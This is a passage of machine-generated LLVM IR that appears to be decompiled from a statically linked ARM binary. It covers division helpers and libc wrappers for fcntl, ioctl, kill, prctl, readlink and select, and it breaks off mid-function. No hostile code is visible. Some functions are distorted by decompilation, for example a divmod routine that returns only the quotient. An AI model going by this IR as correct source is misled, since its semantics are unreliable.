  %v1_11184 = phi i32 [ %v6_11178, %bb87 ], [ %v1_11178, %.thread8 ], [ %v6_11178, %bb88 ]
  %v1_11188 = phi i32 [ %v1_1117c, %bb87 ], [ %v1_1117c, %.thread8 ], [ %v6_1117c, %bb88 ]
  %v4_11180 = udiv i32 %v1_11194, 8
  %v6_11180 = icmp ult i32 %v1_11184, %v4_11180
  br i1 %v6_11180, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_11184 = and i32 %v1_11194, 4
  %v4_11184 = icmp eq i32 %v3_11184, 0
  %v6_11184 = sub i32 %v1_11184, %v4_11180
  store i32 %v6_11184, i32* %r0.global-to-local, align 4
  br i1 %v4_11184, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_11188 = udiv i32 %v1_11190, 8
  %v6_11188 = or i32 %v1_11188, %v5_11188
  store i32 %v6_11188, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_1119c = phi i32 [ %v1_11188, %bb89 ], [ %v1_11188, %.thread9 ], [ %v6_11188, %bb90 ]
  %v0_1118c = phi i32 [ %v6_11184, %bb89 ], [ %v1_11184, %.thread9 ], [ %v6_11184, %bb90 ]
  %v2_1118c = icmp eq i32 %v0_1118c, 0
  br i1 %v2_1118c, label %dec_label_pc_1119c, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_11190, 16
  br i1 %tmp138, label %dec_label_pc_1119c, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_11190 = udiv i32 %v1_11190, 16
  %v4_11194 = udiv i32 %v1_11194, 16
  br label %dec_label_pc_1115c

dec_label_pc_1119c:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_1119c, i32* %r0.global-to-local, align 4
  ret i32 %v0_1119c

dec_label_pc_111a4:                               ; preds = %dec_label_pc_11110
  %v9_11110 = icmp eq i32 %v0_11110, %v1_11110
  %. = zext i1 %v9_11110 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_111b0:                               ; preds = %dec_label_pc_11118
  %v2_111b0 = icmp ugt i32 %v1_11110, 65535
  br i1 %v2_111b0, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_111b0
  %v2_111b4 = and i32 %v1_11110, 32768
  %v3_111b4 = icmp eq i32 %v2_111b4, 0
  %v4_111b4 = udiv i32 %v1_11110, 65536
  br i1 %v3_111b4, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_111b0
  %v0_111c065 = phi i32 [ %v1_11110, %dec_label_pc_111b0 ], [ %v4_111b4, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_111c4 = phi i32 [ %v0_111c065, %.thread16 ], [ %v4_111b4, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_111c0 = icmp ugt i32 %v1_111c4, 255
  br i1 %v2_111c0, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_111c4 = and i32 %v1_111c4, 128
  %v3_111c4 = icmp eq i32 %v2_111c4, 0
  %v4_111c4 = udiv i32 %v1_111c4, 256
  br i1 %v3_111c4, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_111c8 = or i32 %storemerge, 8
  store i32 %v2_111c8, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_111d4 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_111c8, %bb98 ]
  %v1_111d0 = phi i32 [ %v1_111c4, %bb96 ], [ %v4_111c4, %bb97 ], [ %v4_111c4, %bb98 ]
  %v2_111cc = icmp ugt i32 %v1_111d0, 15
  br i1 %v2_111cc, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_111d0 = and i32 %v1_111d0, 8
  %v3_111d0 = icmp eq i32 %v2_111d0, 0
  %v4_111d0 = udiv i32 %v1_111d0, 16
  br i1 %v3_111d0, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_111d4 = add nsw i32 %v1_111d4, 4
  store i32 %v2_111d4, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_111dc = phi i32 [ %v1_111d4, %.thread17 ], [ %v1_111d4, %bb99 ], [ %v2_111d4, %bb100 ]
  %v5_111e0 = phi i32 [ %v1_111d0, %.thread17 ], [ %v4_111d0, %bb99 ], [ %v4_111d0, %bb100 ]
  %v2_111d8 = icmp ugt i32 %v5_111e0, 3
  %v7_111d8 = icmp eq i32 %v5_111e0, 4
  %v2_111dc = xor i1 %v7_111d8, true
  %v3_111dc = and i1 %v2_111d8, %v2_111dc
  br i1 %v3_111dc, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_111dc = add nsw i32 %v4_111dc, 3
  store i32 %v5_111dc, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_111e0 = phi i32 [ %v4_111dc, %.thread18 ], [ %v5_111dc, %bb101 ]
  %v2_111e0 = xor i1 %v2_111d8, true
  %v3_111e0 = or i1 %v7_111d8, %v2_111e0
  br i1 %v3_111e0, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_111e0 = udiv i32 %v5_111e0, 2
  %v9_111e0 = add i32 %v4_111e0, %v8_111e0
  store i32 %v9_111e0, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_111e4 = phi i32 [ %v4_111e0, %bb102 ], [ %v9_111e0, %bb103 ]
  %v6_111e4 = lshr i32 %v0_11110, %v1_111e4
  store i32 %v6_111e4, i32* %r0.global-to-local, align 4
  ret i32 %v6_111e4

dec_label_pc_111ec:                               ; preds = %entry
  %v0_111f0 = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_111e0, { 1, 0 }
  uselistorder i1 %v7_111d8, { 1, 0 }
  uselistorder i32 %v4_111d0, { 1, 0 }
  uselistorder i32 %v1_111d0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_111c8, { 1, 0 }
  uselistorder i32 %v4_111c4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_111c4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_111b4, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_1118c, { 1, 0 }
  uselistorder i32 %v0_1119c, { 1, 0, 2 }
  uselistorder i32 %v4_11180, { 1, 0 }
  uselistorder i32 %v1_11188, { 1, 2, 0 }
  uselistorder i32 %v4_11174, { 1, 0 }
  uselistorder i32 %v1_1117c, { 1, 2, 0 }
  uselistorder i32 %v4_11168, { 1, 0 }
  uselistorder i32 %v1_11170, { 1, 2, 0 }
  uselistorder i32 %v1_11194, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_11164, { 1, 0 }
  uselistorder i32 %v1_11190, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_11150, { 1, 0 }
  uselistorder i32 %v3_1114c, { 1, 0 }
  uselistorder i32 %v1_1114c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_11150, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1113c, { 1, 0 }
  uselistorder i32 %v4_11138, { 2, 1, 0 }
  uselistorder i32 %v1_1113c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_11144.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_11110, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_11110, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_11104, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder i32 65535, { 4, 0, 1, 2, 3 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_1119c, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_11158, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11144thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_11204 = udiv i32 %arg1, %arg2
  ret i32 %v2_11204
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_11220 = call i32 @__GI_raise(i32 8)
  ret i32 %v1_11220
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v1_1123c = add i32 %arg2, -12
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_1123c, 2
  br i1 %tmp, label %dec_label_pc_11278, label %dec_label_pc_11254

dec_label_pc_11254:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp12 = icmp ult i32 %arg1, -4095
  br i1 %tmp12, label %dec_label_pc_112ac, label %dec_label_pc_11268

dec_label_pc_11268:                               ; preds = %dec_label_pc_11254
  %v0_1126c = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_112a0

dec_label_pc_11278:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp13 = icmp ugt i32 %arg1, -4096
  br i1 %tmp13, label %dec_label_pc_11294, label %dec_label_pc_112ac

dec_label_pc_11294:                               ; preds = %dec_label_pc_11278
  %v0_11298 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_112a0

dec_label_pc_112a0:                               ; preds = %dec_label_pc_11268, %dec_label_pc_11294
  %storemerge2 = phi i32 [ %v0_1126c, %dec_label_pc_11268 ], [ %v0_11298, %dec_label_pc_11294 ]
  %storemerge.in = load i16, i16* @global_var_2229c.359, align 2
  %storemerge = sext i16 %storemerge.in to i32
  %v0_112a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_112a0 = sub i32 0, %v0_112a0
  store i32 %v1_112a0, i32* %r2.global-to-local, align 4
  %v3_112a4 = add i32 %storemerge, %storemerge2
  %v4_112a4 = inttoptr i32 %v3_112a4 to i32*
  store i32 %v1_112a0, i32* %v4_112a4, align 4
  br label %dec_label_pc_112ac

dec_label_pc_112ac:                               ; preds = %dec_label_pc_11254, %dec_label_pc_11278, %dec_label_pc_112a0
  %storemerge1 = phi i32 [ -1, %dec_label_pc_112a0 ], [ %arg1, %dec_label_pc_11278 ], [ %arg1, %dec_label_pc_11254 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 5, 1, 4 }
  uselistorder label %dec_label_pc_112ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_112a0, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_112c4 = load i32, i32* @r2, align 4
  %v9_112c4 = load i32, i32* @r3, align 4
  store i32 %v9_112c4, i32* %stack_var_-4, align 4
  %v3_112c8 = load i32, i32* @r4, align 4
  store i32 %v3_112c8, i32* %stack_var_-32, align 4
  %v6_112c8 = load i32, i32* @r5, align 4
  %v12_112c8 = load i32, i32* @r7, align 4
  %v4_112d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 12824) to i32*), align 4
  %v2_112e0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_112e0, i32* @r3, align 4
  %v2_112e4 = icmp eq i32 %v4_112d8, 0
  %v0_112ec = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_112ec, i32* @r5, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v6_112c4, i32* @r4, align 4
  br i1 %v2_112e4, label %dec_label_pc_11308, label %dec_label_pc_112fc

dec_label_pc_112fc:                               ; preds = %entry
  %v7_112fc = icmp eq i32 %arg2, 7
  br i1 %v7_112fc, label %dec_label_pc_11348, label %bb

bb:                                               ; preds = %dec_label_pc_112fc
  %v8_11300 = icmp eq i32 %arg2, 14
  br i1 %v8_11300, label %dec_label_pc_11348, label %dec_label_pc_11308

dec_label_pc_11308:                               ; preds = %bb, %entry
  store i32 %arg2, i32* @r1, align 4
  store i32 %v0_112ec, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_112ec, -4095
  br i1 %tmp, label %dec_label_pc_11340, label %dec_label_pc_11328

dec_label_pc_11328:                               ; preds = %dec_label_pc_11308
  %v0_1132c = call i32 @__aeabi_read_tp()
  %v3_11330 = load i16, i16* @global_var_2229c.359, align 2
  %v4_11330 = sext i16 %v3_11330 to i32
  store i32 %v4_11330, i32* @r3, align 4
  %v0_11334 = load i32, i32* @r2, align 4
  %v1_11334 = sub i32 0, %v0_11334
  store i32 %v1_11334, i32* @r2, align 4
  %v3_11338 = add i32 %v4_11330, %v0_1132c
  %v4_11338 = inttoptr i32 %v3_11338 to i32*
  store i32 %v1_11334, i32* %v4_11338, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11340

dec_label_pc_11340:                               ; preds = %dec_label_pc_11308, %dec_label_pc_11328
  %v0_11340 = phi i32 [ %v0_112ec, %dec_label_pc_11308 ], [ -1, %dec_label_pc_11328 ]
  br label %dec_label_pc_11394

dec_label_pc_11348:                               ; preds = %dec_label_pc_112fc, %bb
  %v0_11348 = call i32 @__libc_enable_asynccancel()
  %v0_1134c = load i32, i32* @r7, align 4
  store i32 %v0_1134c, i32* @r1, align 4
  store i32 %v0_11348, i32* %r6.global-to-local, align 4
  %v0_11358 = load i32, i32* @r5, align 4
  store i32 %v0_11358, i32* %r0.global-to-local, align 4
  store i32 %v0_11358, i32* @r2, align 4
  %tmp15 = icmp ult i32 %v0_11358, -4095
  br i1 %tmp15, label %dec_label_pc_11388, label %dec_label_pc_11370

dec_label_pc_11370:                               ; preds = %dec_label_pc_11348
  %v1_11374 = sub i32 0, %v0_11358
  %v0_11378 = call i32 @__aeabi_read_tp()
  store i32 %v0_11378, i32* %r0.global-to-local, align 4
  %v3_1137c = load i16, i16* @global_var_2229c.359, align 2
  %v4_1137c = sext i16 %v3_1137c to i32
  store i32 %v4_1137c, i32* @r3, align 4
  %v3_11380 = add i32 %v4_1137c, %v0_11378
  %v4_11380 = inttoptr i32 %v3_11380 to i32*
  store i32 %v1_11374, i32* %v4_11380, align 4
  store i32 -1, i32* @r2, align 4
  %v0_11388.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11388

dec_label_pc_11388:                               ; preds = %dec_label_pc_11348, %dec_label_pc_11370
  %v0_1138c = phi i32 [ %v0_11358, %dec_label_pc_11348 ], [ -1, %dec_label_pc_11370 ]
  %v0_11388 = phi i32 [ %v0_11348, %dec_label_pc_11348 ], [ %v0_11388.pre, %dec_label_pc_11370 ]
  store i32 %v0_11388, i32* %r0.global-to-local, align 4
  store i32 %v0_1138c, i32* @r7, align 4
  %v1_11390 = call i32 @__libc_disable_asynccancel(i32 %v0_11388)
  store i32 %v1_11390, i32* %r0.global-to-local, align 4
  %v0_11394.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_11394

dec_label_pc_11394:                               ; preds = %dec_label_pc_11340, %dec_label_pc_11388
  %v0_11394 = phi i32 [ %v0_11340, %dec_label_pc_11340 ], [ %v0_11394.pre, %dec_label_pc_11388 ]
  store i32 %v0_11394, i32* %r0.global-to-local, align 4
  %v2_1139c = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_1139c, i32* @r4, align 4
  store i32 %v6_112c8, i32* @r5, align 4
  store i32 %v12_112c8, i32* @r7, align 4
  ret i32 %v0_11394

; uselistorder directives
  uselistorder i32 %v0_11394, { 1, 0 }
  uselistorder i32 %v0_11388, { 1, 0 }
  uselistorder i32 %v0_11358, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_112ec, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 2, 7, 6, 0, 1 }
  uselistorder label %dec_label_pc_11394, { 1, 0 }
  uselistorder label %dec_label_pc_11388, { 1, 0 }
  uselistorder label %dec_label_pc_11348, { 1, 0 }
  uselistorder label %dec_label_pc_11340, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v1_113c8 = load i32, i32* @r0, align 4
  ret i32 %v1_113c8
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v9_113cc = load i32, i32* @r3, align 4
  store i32 %v9_113cc, i32* %stack_var_-4, align 4
  %v3_113d0 = load i32, i32* @r4, align 4
  store i32 %v3_113d0, i32* %stack_var_-32, align 4
  %v6_113d0 = load i32, i32* @r5, align 4
  %v12_113d0 = load i32, i32* @r7, align 4
  %v4_113e0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 12824) to i32*), align 4
  %v2_113e8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_113e8, i32* @r3, align 4
  %v2_113ec = icmp eq i32 %v4_113e0, 0
  %v0_113f4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_113f4, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v2_113ec, label %dec_label_pc_11404, label %dec_label_pc_1143c

dec_label_pc_11404:                               ; preds = %entry
  %tmp = icmp ult i32 %v0_113f4, -4095
  br i1 %tmp, label %dec_label_pc_11434, label %dec_label_pc_1141c

dec_label_pc_1141c:                               ; preds = %dec_label_pc_11404
  %v1_11420 = sub i32 0, %v0_113f4
  %v3_11424 = load i16, i16* @global_var_2229c.359, align 2
  %v4_11424 = sext i16 %v3_11424 to i32
  store i32 %v4_11424, i32* @r3, align 4
  %v0_11428 = call i32 @__aeabi_read_tp()
  %v2_1142c = load i32, i32* @r3, align 4
  %v3_1142c = add i32 %v2_1142c, %v0_11428
  %v4_1142c = inttoptr i32 %v3_1142c to i32*
  store i32 %v1_11420, i32* %v4_1142c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11434

dec_label_pc_11434:                               ; preds = %dec_label_pc_11404, %dec_label_pc_1141c
  %v0_11434 = phi i32 [ %v0_113f4, %dec_label_pc_11404 ], [ -1, %dec_label_pc_1141c ]
  br label %dec_label_pc_11488

dec_label_pc_1143c:                               ; preds = %entry
  %v0_1143c = call i32 @__libc_enable_asynccancel()
  store i32 %v0_1143c, i32* %r6.global-to-local, align 4
  %v0_1144c = load i32, i32* @r4, align 4
  store i32 %v0_1144c, i32* %r0.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_1144c, -4095
  br i1 %tmp15, label %dec_label_pc_1147c, label %dec_label_pc_11464

dec_label_pc_11464:                               ; preds = %dec_label_pc_1143c
  %v1_11468 = sub i32 0, %v0_1144c
  %v3_1146c = load i16, i16* @global_var_2229c.359, align 2
  %v4_1146c = sext i16 %v3_1146c to i32
  store i32 %v4_1146c, i32* @r3, align 4
  %v0_11470 = call i32 @__aeabi_read_tp()
  store i32 %v0_11470, i32* %r0.global-to-local, align 4
  %v2_11474 = load i32, i32* @r3, align 4
  %v3_11474 = add i32 %v2_11474, %v0_11470
  %v4_11474 = inttoptr i32 %v3_11474 to i32*
  store i32 %v1_11468, i32* %v4_11474, align 4
  %v0_1147c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1147c

dec_label_pc_1147c:                               ; preds = %dec_label_pc_1143c, %dec_label_pc_11464
  %v0_11480 = phi i32 [ %v0_1144c, %dec_label_pc_1143c ], [ -1, %dec_label_pc_11464 ]
  %v0_1147c = phi i32 [ %v0_1143c, %dec_label_pc_1143c ], [ %v0_1147c.pre, %dec_label_pc_11464 ]
  store i32 %v0_1147c, i32* %r0.global-to-local, align 4
  store i32 %v0_11480, i32* @r7, align 4
  %v1_11484 = call i32 @__libc_disable_asynccancel(i32 %v0_1147c)
  store i32 %v1_11484, i32* %r0.global-to-local, align 4
  %v0_11488.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_11488

dec_label_pc_11488:                               ; preds = %dec_label_pc_11434, %dec_label_pc_1147c
  %v0_11488 = phi i32 [ %v0_11434, %dec_label_pc_11434 ], [ %v0_11488.pre, %dec_label_pc_1147c ]
  store i32 %v0_11488, i32* %r0.global-to-local, align 4
  %v2_11490 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_11490, i32* @r4, align 4
  store i32 %v6_113d0, i32* @r5, align 4
  store i32 %v12_113d0, i32* @r7, align 4
  ret i32 %v0_11488

; uselistorder directives
  uselistorder i32 %v0_11488, { 1, 0 }
  uselistorder i32 %v0_1147c, { 1, 0 }
  uselistorder i32 %v0_1144c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_113f4, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_11488, { 1, 0 }
  uselistorder label %dec_label_pc_1147c, { 1, 0 }
  uselistorder label %dec_label_pc_11434, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_114ac = load i32, i32* @r7, align 4
  store i32 %v3_114ac, i32* %stack_var_-8, align 4
  %v0_114b8 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_114b8, -4095
  br i1 %tmp, label %dec_label_pc_114d8, label %dec_label_pc_114c0

dec_label_pc_114c0:                               ; preds = %entry
  %v1_114c4 = sub i32 0, %v0_114b8
  %v3_114c8 = load i16, i16* @global_var_2229c.359, align 2
  %v4_114c8 = sext i16 %v3_114c8 to i32
  %v0_114cc = call i32 @__aeabi_read_tp()
  %v3_114d0 = add i32 %v4_114c8, %v0_114cc
  %v4_114d0 = inttoptr i32 %v3_114d0 to i32*
  store i32 %v1_114c4, i32* %v4_114d0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_114d8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_114d8

dec_label_pc_114d8:                               ; preds = %entry, %dec_label_pc_114c0
  %v1_114dc = phi i32 [ %v0_114b8, %entry ], [ -1, %dec_label_pc_114c0 ]
  %v2_114d8 = phi i32 [ %v3_114ac, %entry ], [ %v2_114d8.pre, %dec_label_pc_114c0 ]
  store i32 %v2_114d8, i32* @r7, align 4
  ret i32 %v1_114dc

; uselistorder directives
  uselistorder i32 %v0_114b8, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_114d8, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_114e4 = load i32, i32* @r4, align 4
  store i32 %v3_114e4, i32* %stack_var_-12, align 4
  %v0_114f4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_114f4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_114f4, -4095
  br i1 %tmp, label %dec_label_pc_1151c, label %dec_label_pc_11504

dec_label_pc_11504:                               ; preds = %entry
  %v0_11508 = call i32 @__aeabi_read_tp()
  %v3_1150c = load i16, i16* @global_var_2229c.359, align 2
  %v4_1150c = sext i16 %v3_1150c to i32
  %v0_11510 = load i32, i32* %r2.global-to-local, align 4
  %v1_11510 = sub i32 0, %v0_11510
  store i32 %v1_11510, i32* %r2.global-to-local, align 4
  %v3_11514 = add i32 %v4_1150c, %v0_11508
  %v4_11514 = inttoptr i32 %v3_11514 to i32*
  store i32 %v1_11510, i32* %v4_11514, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1151c.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1151c

dec_label_pc_1151c:                               ; preds = %entry, %dec_label_pc_11504
  %v1_11520 = phi i32 [ %v0_114f4, %entry ], [ -1, %dec_label_pc_11504 ]
  %v2_1151c = phi i32 [ %v3_114e4, %entry ], [ %v2_1151c.pre, %dec_label_pc_11504 ]
  store i32 %v2_1151c, i32* @r4, align 4
  ret i32 %v1_11520

; uselistorder directives
  uselistorder i32 %v0_114f4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1151c, { 1, 0 }
}

define i32 @readlink(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11528 = load i32, i32* @r7, align 4
  store i32 %v3_11528, i32* %stack_var_-8, align 4
  %v0_11534 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11534, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_11534, -4095
  br i1 %tmp, label %dec_label_pc_1155c, label %dec_label_pc_11544

dec_label_pc_11544:                               ; preds = %entry
  %v0_11548 = call i32 @__aeabi_read_tp()
  %v3_1154c = load i16, i16* @global_var_2229c.359, align 2
  %v4_1154c = sext i16 %v3_1154c to i32
  store i32 %v4_1154c, i32* @r3, align 4
  %v0_11550 = load i32, i32* @r2, align 4
  %v1_11550 = sub i32 0, %v0_11550
  store i32 %v1_11550, i32* @r2, align 4
  %v3_11554 = add i32 %v4_1154c, %v0_11548
  %v4_11554 = inttoptr i32 %v3_11554 to i32*
  store i32 %v1_11550, i32* %v4_11554, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1155c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1155c

dec_label_pc_1155c:                               ; preds = %entry, %dec_label_pc_11544
  %v1_11560 = phi i32 [ %v0_11534, %entry ], [ -1, %dec_label_pc_11544 ]
  %v2_1155c = phi i32 [ %v3_11528, %entry ], [ %v2_1155c.pre, %dec_label_pc_11544 ]
  store i32 %v2_1155c, i32* @r7, align 4
  ret i32 %v1_11560

; uselistorder directives
  uselistorder i32 %v0_11534, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1155c, { 1, 0 }
}

define i32 @__syscall_select() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_11568 = load i32, i32* @r4, align 4
  store i32 %v3_11568, i32* %stack_var_-12, align 4
  %v0_11578 = load i32, i32* @r0, align 4
  store i32 %v0_11578, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11578, -4095
  br i1 %tmp, label %dec_label_pc_115a0, label %dec_label_pc_11588

dec_label_pc_11588:                               ; preds = %entry
  %v0_1158c = call i32 @__aeabi_read_tp()
  %v3_11590 = load i16, i16* @global_var_2229c.359, align 2
  %v4_11590 = sext i16 %v3_11590 to i32
  %v0_11594 = load i32, i32* %r2.global-to-local, align 4
  %v1_11594 = sub i32 0, %v0_11594
  store i32 %v1_11594, i32* %r2.global-to-local, align 4
  %v3_11598 = add i32 %v4_11590, %v0_1158c
  %v4_11598 = inttoptr i32 %v3_11598 to i32*
  store i32 %v1_11594, i32* %v4_11598, align 4
  %v2_115a0.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_115a0

dec_label_pc_115a0:                               ; preds = %entry, %dec_label_pc_11588
  %v1_115a4 = phi i32 [ %v0_11578, %entry ], [ -1, %dec_label_pc_11588 ]
  %v2_115a0 = phi i32 [ %v3_11568, %entry ], [ %v2_115a0.pre, %dec_label_pc_11588 ]
  store i32 %v2_115a0, i32* @r4, align 4
  ret i32 %v1_115a4

; uselistorder directives
  uselistorder i32 %v0_11578, { 1, 0, 2 }
  uselistorder label %dec_label_pc_115a0, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_115ac = load i32, i32* @r4, align 4
